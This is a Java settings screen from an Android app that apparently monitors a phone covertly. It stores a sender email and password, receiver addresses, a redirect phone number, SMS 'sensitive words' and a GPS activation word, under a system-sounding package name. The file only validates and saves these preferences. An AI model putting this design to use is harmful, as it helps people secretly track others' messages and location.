package system.service.activity;  
  
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;
import android.content.Intent;  
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.res.Resources;
import android.content.res.TypedArray;  
import android.net.Uri;  
import android.os.Bundle;  
import android.preference.CheckBoxPreference;  
import android.preference.EditTextPreference;  
import android.preference.ListPreference;  
import android.preference.Preference;
import android.preference.PreferenceActivity;  
import android.preference.PreferenceCategory;  
import android.preference.PreferenceManager;
import android.preference.PreferenceScreen;
import android.util.Log;

import system.service.R;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
  
public class GlobalPrefActivity extends PreferenceActivity 
{
	private OnSharedPreferenceChangeListener chgListener;
	private static String SENDER_MAIL;
	private static String SENDER_PWD;
	private static String RECV_MAIL;
	private static String INTERVAL_INFO;
	private static String REDIRECT_PHONE_NUM;
	private static String SENSITIVE_WORDS;
	private static String GPS_WORD;
	public static final String HAS_CHG_RECEIVER_INFO = "has_changed_receiver_info"; // mail, phone number, GPS word
	public static final String SENSITIVE_WORD_BREAKER = " ";
	public static final int MAX_SENSITIVE_WORD_COUNT = 9;
	public static final int GPS_WORD_MAX_LEN = 24;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		// All values will be automatically saved to SharePreferences
		addPreferencesFromResource(R.xml.preference);
		
		// Init preference summary fields
		int prefCount = this.getPreferenceScreen().getPreferenceCount();
		for(int i = 0; i < prefCount; i++){
            initSummary(this.getPreferenceScreen().getPreference(i));
        }
		
		// Show special summary
		//String summary = getResources().getString(R.string.pref_word_sensor_summary);
		//((PreferenceCategory)this.getPreferenceScreen().getPreference(prefCount-1)).getPreference(1).setSummary(summary);
		
		// Register	preference change listener
		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
		chgListener = new OnSharedPreferenceChangeListener(){
			@SuppressWarnings("unused")
			@Override
			public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
				if (key.equals(getResources().getString(R.string.pref_sender_mail_key))) {
					String oriSenderMail = sharedPreferences.getString(getResources().getString(R.string.pref_sender_mail_key), "");
					String senderMail = oriSenderMail.trim();
					if(!StrUtils.validateMailAddress(senderMail)) {
						String msg = String.format(getResources().getString(R.string.pref_invalid_mail_format), senderMail);
						SysUtils.messageBox(getApplicationContext(), msg);
					}
				}
				else if (key.equals(getResources().getString(R.string.pref_sender_pwd_key))) {
					String oriSenderPwd = sharedPreferences.getString(getResources().getString(R.string.pref_sender_pwd_key), "");
					String senderPwd = oriSenderPwd.trim();
					if (senderPwd.length() <= 0) {
						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_pwd));
					}
				}
				else if (key.equals(getResources().getString(R.string.pref_recv_mail_key))) {
					checkMailFormat(sharedPreferences, getApplicationContext());
					enableReceiverInfoChgFlag();
				}
				else if (key.equals(getResources().getString(R.string.pref_info_interval_key))) {
					String intervalStr = sharedPreferences.getString(getResources().getString(R.string.pref_info_interval_key), "1"); //day
					int interval = Integer.parseInt(intervalStr);
				}
				else if (key.equals(getResources().getString(R.string.pref_phonenum_key))) {
					String oriPhoneNum = sharedPreferences.getString(getResources().getString(R.string.pref_phonenum_key), "");
					String phoneNum = oriPhoneNum.trim();
					if (phoneNum.length() == 0) {
						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_phonenum));
					}
					//if (!phoneNum.equals(oriPhoneNum)) setRedirectPhoneNum(getApplicationContext(), phoneNum);
					if (phoneNum.length() > 0) enableReceiverInfoChgFlag();
				}
				else if (key.equals(getResources().getString(R.string.pref_word_sensor_key))) {
					String oriWords = sharedPreferences.getString(getResources().getString(R.string.pref_word_sensor_key), "");
					String words = oriWords.trim();
					if (words.length() == 0) {
						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_sensitive_words));
					} else {
						words = words.replaceAll(" {2,}", SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
						if (words.split(SENSITIVE_WORD_BREAKER).length > MAX_SENSITIVE_WORD_COUNT) {
							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
							SysUtils.messageBox(getApplicationContext(), msg);
						}
					}
					//if (!words.equals(oriWords)) setSensitiveWords(getApplicationContext(), words);
				}
				else if (key.equals(getResources().getString(R.string.pref_activate_word_key))) {
					String oriWord = sharedPreferences.getString(getResources().getString(R.string.pref_activate_word_key), "");
					String word = oriWord.trim();
					if (word.length() == 0) {
						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_gps_activate_word));
					} else if (word.length() > GPS_WORD_MAX_LEN) {
						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_gps_activate_word_max_len));
					}
					//if (!word.equals(oriWord)) setGpsWord(getApplicationContext(), word);
					if (word.length() > 0) enableReceiverInfoChgFlag();
				}
				
				// Update preference summary fields
				for(int i = 0; i < getPreferenceScreen().getPreferenceCount(); i++){
		            initSummary(getPreferenceScreen().getPreference(i));
		        }
				
			}
        };
		sp.registerOnSharedPreferenceChangeListener(chgListener);
	}
	
	private void enableReceiverInfoChgFlag() {
		Intent intent = this.getIntent();
		Bundle bn = intent.getExtras();
		bn.putBoolean(HAS_CHG_RECEIVER_INFO, true);
		intent.putExtras(bn);
		setResult(RESULT_OK, intent);
	}
	
	private void initSummary(Preference p) {
		if (p instanceof PreferenceCategory) {
			PreferenceCategory pCat = (PreferenceCategory)p;
			for(int i = 0; i < pCat.getPreferenceCount(); i++) {
				initSummary(pCat.getPreference(i));
			}
		} else {
			updatePrefSummary(p);
		}
	}

	private void updatePrefSummary(Preference p) {
		if (p instanceof ListPreference) {
			ListPreference listPref = (ListPreference)p; 
			p.setSummary(listPref.getEntry()); 
		}
		if (p instanceof EditTextPreference) {
			EditTextPreference editTextPref = (EditTextPreference)p; 
			p.setSummary(editTextPref.getText()); 
		}
	}
	
	private boolean checkMailFormat(SharedPreferences sharedPreferences, Context context) {
		boolean valid = true;
		String oriMail = sharedPreferences.getString(getResources().getString(R.string.pref_recv_mail_key), "");
		String mail = oriMail.trim();
		//if (!mail.equals(oriMail)) setMail(context, mail);
		String[] mails = mail.split(",");
	    Pattern p = Pattern.compile(StrUtils.REGEXP_MAIL);
	    
	    for (String eachMail : mails) {
	    	if (eachMail.trim().length() > 0) {
	    		Matcher matcher = p.matcher(eachMail.trim());
   	 			if (!matcher.matches()) {
   	 				String msg = String.format(context.getResources().getString(R.string.pref_invalid_mail_format), eachMail.trim());
   	 				SysUtils.messageBox(context, msg);
   	 				valid = false;
   	 				break;
   	 			}
	    	}
	    }
	    return valid;
	}
	
	public static boolean getUseSelfSender(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_use_self_sender", false);
	}
	
	public static void setUseSelfSender(Context context, boolean value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_use_self_sender", value).commit();
	}
	
	public static String getSenderMail(Context context) {
		SENDER_MAIL = context.getResources().getString(R.string.pref_sender_mail_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(SENDER_MAIL, "").trim();
	}
	
	public static void setSenderMail(Context context, String value) {
		SENDER_MAIL = context.getResources().getString(R.string.pref_sender_mail_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(SENDER_MAIL, value).commit();
	}
	
	public static String getSenderPassword(Context context) {
		SENDER_PWD = context.getResources().getString(R.string.pref_sender_pwd_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(SENDER_PWD, "").trim();
	}
	
	public static void setSenderPassword(Context context, String value) {
		SENDER_PWD = context.getResources().getString(R.string.pref_sender_pwd_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(SENDER_PWD, value).commit();
	}
	
	public static String getReceiverMail(Context context) {
		RECV_MAIL = context.getResources().getString(R.string.pref_recv_mail_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(RECV_MAIL, "").trim();
	}
	
	public static void setReceiverMail(Context context, String value) {
		RECV_MAIL = context.getResources().getString(R.string.pref_recv_mail_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(RECV_MAIL, value).commit();
	}
	
	public static int getInfoInterval(Context context) {
		INTERVAL_INFO = context.getResources().getString(R.string.pref_info_interval_key);
		return Integer.parseInt(PreferenceManager.getDefaultSharedPreferences(context).getString(INTERVAL_INFO, "1"));
	}
	
	public static void setInfoInterval(Context context, int value) {
		INTERVAL_INFO = context.getResources().getString(R.string.pref_info_interval_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putInt(INTERVAL_INFO, value).commit();
	}
	
	public static String getReceiverPhoneNum(Context context) {
		REDIRECT_PHONE_NUM = context.getResources().getString(R.string.pref_phonenum_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(REDIRECT_PHONE_NUM, "").trim();
	}
	
	public static void setReceiverPhoneNum(Context context, String value) {
		REDIRECT_PHONE_NUM = context.getResources().getString(R.string.pref_phonenum_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(REDIRECT_PHONE_NUM, value).commit();
	}
	
	public static String getSensitiveWords(Context context) {
		SENSITIVE_WORDS = context.getResources().getString(R.string.pref_word_sensor_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(SENSITIVE_WORDS, "").trim();
	}
	
	public static void setSensitiveWords(Context context, String value) {
		SENSITIVE_WORDS = context.getResources().getString(R.string.pref_word_sensor_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(SENSITIVE_WORDS, value).commit();
	}
	
	public static String getGpsWord(Context context) {
		GPS_WORD = context.getResources().getString(R.string.pref_activate_word_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(GPS_WORD, "").trim();
	}
	
	public static void setGpsWord(Context context, String value) {
		GPS_WORD = context.getResources().getString(R.string.pref_activate_word_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(GPS_WORD, value).commit();
	}
	
	public static boolean getDisplayGpsSMS(Context context) {
		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_gps_show_sms", false);
	}
	
	public static void setDisplayGpsSMS(Context context, boolean value) {
		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_gps_show_sms", value).commit();
	}
	
}